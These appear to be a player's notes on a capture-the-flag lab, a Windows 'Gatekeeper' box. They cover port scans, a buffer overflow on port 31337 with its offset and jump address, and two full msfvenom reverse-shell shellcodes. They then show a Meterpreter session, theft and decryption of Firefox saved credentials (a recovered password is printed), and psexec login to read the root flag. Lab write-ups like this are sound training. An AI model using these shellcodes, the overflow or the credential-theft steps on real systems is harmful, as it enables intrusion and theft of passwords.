```
└─$ nmap 10.10.160.132
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 09:07 EDT
Nmap scan report for 10.10.160.132
Host is up (0.15s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
31337/tcp open  Elite
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49161/tcp open  unknown
49167/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds
 ```
 
 
``` 
└─$ nmap --script=vuln -sV -A -sC 10.10.160.132                                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 09:09 EDT
Nmap scan report for 10.10.160.132
Host is up (0.14s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
49167/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=5/22%Time=60A902BD%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 232.53 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p135,139,445,3389,31337 10.10.160.132                           131 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 10:00 EDT
Nmap scan report for 10.10.160.132
Host is up (0.17s latency).

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2021-05-21T12:56:59
|_Not valid after:  2021-11-20T12:56:59
|_ssl-date: 2021-05-22T14:03:25+00:00; -1s from scanner time.
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=5/22%Time=60A90E91%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h00m00s, median: -1s
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:76:23:f9:41:e3 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-22T10:03:19-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-22T14:03:20
|_  start_date: 2021-05-22T13:31:42

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.76 seconds
```


```                                                                                
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.160.132                           
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
SMB1 disabled -- no workgroup available


                                                                                  
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.160.132\\Users
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
SMB1 disabled -- no workgroup available







MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.

https://www.exploit-db.com/exploits/18606

 ```    
 
 ```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc 10.10.160.132 3389 < termdd_1.dat                                       1 ⨯
�4
��<����5�          
```

tried with the python fuzzer but didn't work writeup says to use pry,,, 

s=TCPSocket.new("10.0.2.6",31337)

```
                                                                                                  
┌──(kali㉿kali)-[/hackme/bufferOverflow]
└─$ pry --simple-prompt 
>> require "socket"
=> true
>> s=TCPSocket.new("10.0.2.6",31337)
=> #<TCPSocket:fd 6, AF_INET, 10.0.2.15, 51786>
>> s.puts "A"*200
=> nil
>> s.puts "A"*200
=> nil
>> s=TCPSocket.new("10.0.2.6",31337)
=> #<TCPSocket:fd 7, AF_INET, 10.0.2.15, 51788>
>> s.puts "A"*100				no crash
=> nil
>> s.puts "A"*150				crashed
=> nil
```

```
──(kali㉿kali)-[/hackme/bufferOverflow]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

offset 146

bad characters "\x00\x0a"

jump point 080414C3

"\xC3\x14\x04\x08"




check for ASLR Protection using !mona modules  user should be false

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.65.43 LPORT=9500 -f rb -b "\x00\x0a"

buf = 
"\xb8\x45\xcc\x2f\xb7\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9" +
"\xb1\x52\x83\xc7\x04\x31\x47\x0e\x03\x02\xc2\xcd\x42\x70" +
"\x32\x93\xad\x88\xc3\xf4\x24\x6d\xf2\x34\x52\xe6\xa5\x84" +
"\x10\xaa\x49\x6e\x74\x5e\xd9\x02\x51\x51\x6a\xa8\x87\x5c" +
"\x6b\x81\xf4\xff\xef\xd8\x28\xdf\xce\x12\x3d\x1e\x16\x4e" +
"\xcc\x72\xcf\x04\x63\x62\x64\x50\xb8\x09\x36\x74\xb8\xee" +
"\x8f\x77\xe9\xa1\x84\x21\x29\x40\x48\x5a\x60\x5a\x8d\x67" +
"\x3a\xd1\x65\x13\xbd\x33\xb4\xdc\x12\x7a\x78\x2f\x6a\xbb" +
"\xbf\xd0\x19\xb5\xc3\x6d\x1a\x02\xb9\xa9\xaf\x90\x19\x39" +
"\x17\x7c\x9b\xee\xce\xf7\x97\x5b\x84\x5f\xb4\x5a\x49\xd4" +
"\xc0\xd7\x6c\x3a\x41\xa3\x4a\x9e\x09\x77\xf2\x87\xf7\xd6" +
"\x0b\xd7\x57\x86\xa9\x9c\x7a\xd3\xc3\xff\x12\x10\xee\xff" +
"\xe2\x3e\x79\x8c\xd0\xe1\xd1\x1a\x59\x69\xfc\xdd\x9e\x40" +
"\xb8\x71\x61\x6b\xb9\x58\xa6\x3f\xe9\xf2\x0f\x40\x62\x02" +
"\xaf\x95\x25\x52\x1f\x46\x86\x02\xdf\x36\x6e\x48\xd0\x69" +
"\x8e\x73\x3a\x02\x25\x8e\xad\x27\xbc\xd1\x06\x50\xc2\xd1" +
"\x7d\xbc\x4b\x37\x17\xac\x1d\xe0\x80\x55\x04\x7a\x30\x99" +
"\x92\x07\x72\x11\x11\xf8\x3d\xd2\x5c\xea\xaa\x12\x2b\x50" +
"\x7c\x2c\x81\xfc\xe2\xbf\x4e\xfc\x6d\xdc\xd8\xab\x3a\x12" +
"\x11\x39\xd7\x0d\x8b\x5f\x2a\xcb\xf4\xdb\xf1\x28\xfa\xe2" +
"\x74\x14\xd8\xf4\x40\x95\x64\xa0\x1c\xc0\x32\x1e\xdb\xba" +
"\xf4\xc8\xb5\x11\x5f\x9c\x40\x5a\x60\xda\x4c\xb7\x16\x02" +
"\xfc\x6e\x6f\x3d\x31\xe7\x67\x46\x2f\x97\x88\x9d\xeb\xa7" +
"\xc2\xbf\x5a\x20\x8b\x2a\xdf\x2d\x2c\x81\x1c\x48\xaf\x23" +
"\xdd\xaf\xaf\x46\xd8\xf4\x77\xbb\x90\x65\x12\xbb\x07\x85" +
"\x37"
```


awesome we get out nobody shell,, time to escalate

mayor says it best "
Users will need to take one of two paths to discover the credentials needed to escalate privileges 

— manually collect the key4.db, cert9.db, logins.json and cookies.sqlite documents from the AppData\Roaming\Mozilla\Firefox\Profiles directory, 

or utilize the Firefox_creds module from Meterpreter after discovering the application.

For simplicity, I have not included the SMB transfer method.See below for the Metasploit path, which includes modifying the original buffer overflow exploit.
"

msf time

generate meterpreter shell as payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.65.43 LPORT=9999 -f rb -b "\x00\x0a"

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of rb file: 1669 bytes
buf = 
"\xb8\x87\xb8\xfa\x1e\xd9\xca\xd9\x74\x24\xf4\x5b\x29\xc9" +
"\xb1\x59\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x65\x4d\x06" +
"\xf6\xe6\xae\xf7\x07\x98\x27\x12\x36\x8a\x5c\x56\x6b\x1a" +
"\x16\x3a\x80\xd1\x7a\xaf\x13\x97\x52\xfe\xdc\x58\x14\x4a" +
"\x05\x57\x9a\xe7\x75\xf6\x66\xfa\xa9\xd8\x57\x35\xbc\x19" +
"\x9f\x83\xca\xf6\x4d\x43\xbe\x5a\x62\xe0\x82\x66\x83\x26" +
"\x89\xd6\xfb\x43\x4e\xa2\xb7\x4a\x9f\x1a\xc3\x05\x07\x11" +
"\x8b\xb5\x36\xf6\xa9\x7f\x4c\xc4\x80\x80\xe4\xbf\xd7\xf5" +
"\xf6\x69\x26\xca\x38\x5a\x44\x66\xbb\xa3\x6f\x96\xc9\xdf" +
"\x93\x2b\xca\x24\xe9\xf7\x5f\xba\x49\x73\xc7\x1e\x6b\x50" +
"\x9e\xd5\x67\x1d\xd4\xb1\x6b\xa0\x39\xca\x90\x29\xbc\x1c" +
"\x11\x69\x9b\xb8\x79\x29\x82\x99\x27\x9c\xbb\xf9\x80\x41" +
"\x1e\x72\x22\x97\x1e\x7b\xbc\x98\x42\xeb\x70\x55\x7d\xeb" +
"\x1e\xee\x0e\xd9\x81\x44\x99\x51\x49\x43\x5e\xe0\x5d\x74" +
"\xb0\x4a\x0d\x8a\x31\xaa\x07\x49\x65\xfa\x3f\x78\x06\x91" +
"\xbf\x85\xd3\x0f\xca\x11\xd6\xc9\x8b\xca\x8e\xd7\x0b\x2a" +
"\x40\x5e\xed\x64\x0e\x30\xa2\xc4\xfe\xf0\x12\xad\x14\xff" +
"\x4d\xcd\x16\x2a\xe6\x64\xf9\x82\x5e\x11\x60\x8f\x15\x80" +
"\x6d\x1a\x50\x82\xe6\xae\xa4\x4d\x0f\xdb\xb6\xba\x68\x23" +
"\x47\x3b\x1d\x23\x2d\x3f\xb7\x74\xd9\x3d\xee\xb2\x46\xbd" +
"\xc5\xc1\x81\x41\x98\xf3\xfa\x74\x0e\xbb\x94\x78\xde\x3b" +
"\x65\x2f\xb4\x3b\x0d\x97\xec\x68\x28\xd8\x38\x1d\xe1\x4d" +
"\xc3\x77\x55\xc5\xab\x75\x80\x21\x74\x86\xe7\x31\x73\x78" +
"\x75\x1e\xdc\x10\x85\x1e\xdc\xe0\xef\x9e\x8c\x88\xe4\xb1" +
"\x23\x78\x04\x18\x6c\x10\x8f\xcd\xde\x81\x90\xc7\xbf\x1f" +
"\x90\xe4\x1b\x90\xeb\x85\x9c\x51\x0c\x8c\xf8\x52\x0c\xb0" +
"\xfe\x6f\xda\x89\x74\xae\xde\xad\x87\x85\x43\x87\x0d\xe5" +
"\xd0\xd7\x07"



[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.6.65.43
lhost => 10.6.65.43
msf6 exploit(multi/handler) > set lport 9999
lport => 9999
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.6.65.43:9999 
msf6 exploit(multi/handler) > [*] Sending stage (175174 bytes) to 10.10.113.78
[*] Meterpreter session 1 opened (10.6.65.43:9999 -> 10.10.113.78:49219) at 2021-05-23 16:44:45 -0400

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...



run post/windows/gather/enum_applications

run post/multi/gather/firefox_creds

meterpreter > run post/multi/gather/firefox_creds

[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?
[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
[+] Downloaded cert9.db: /home/kali/.msf4/loot/20210523165041_default_10.10.113.78_ff.ljfn812a.cert_706435.bin
[+] Downloaded cookies.sqlite: /home/kali/.msf4/loot/20210523165043_default_10.10.113.78_ff.ljfn812a.cook_346305.bin
[+] Downloaded key4.db: /home/kali/.msf4/loot/20210523165046_default_10.10.113.78_ff.ljfn812a.key4_211928.bin
[+] Downloaded logins.json: /home/kali/.msf4/loot/20210523165049_default_10.10.113.78_ff.ljfn812a.logi_096284.bin

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default

rename the files

installed firefox_decrypt.py to decode files (hackme/scripts)

ran it , and holy crap that was fast !!!
```

```
                                                                                  
┌──(kali㉿kali)-[/hackme/scripts]
└─$ python3 firefox_decrypt.py /home/kali/.msf4/loot/                          1 ⨯
2021-05-23 17:29:28,329 - WARNING - profile.ini not found in /home/kali/.msf4/loot/
2021-05-23 17:29:28,329 - WARNING - Continuing and assuming '/home/kali/.msf4/loot/' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'

mayor:8CL7O1N78MdrCIsV
```


 ```                                                                              
┌──(kali㉿kali)-[/hackme/scripts]
└─$ psexec.py mayor:8CL7O1N78MdrCIsV@10.10.113.78                              1 ⨯
Impacket v0.9.23.dev1+20210427.174742.fc72ebad - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.113.78.....
[*] Found writable share ADMIN$
[*] Uploading file oweOMkrS.exe
[*] Opening SVCManager on 10.10.113.78.....
[*] Creating service TiTt on 10.10.113.78.....
[*] Starting service TiTt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\mayor>cd Desktop

C:\Users\mayor\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\mayor\Desktop

05/14/2020  09:58 PM    <DIR>          .
05/14/2020  09:58 PM    <DIR>          ..
05/14/2020  09:21 PM                27 root.txt.txt
               1 File(s)             27 bytes
               2 Dir(s)  15,845,552,128 bytes free

C:\Users\mayor\Desktop>more root.txt.txt
{Th3_M4y0r_C0ngr4tul4t3s_U}

C:\Users\mayor\Desktop>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 10.10.113.78.....
[*] Stopping service TiTt.....
[*] Removing service TiTt.....
[*] Removing file oweOMkrS.exe.....

```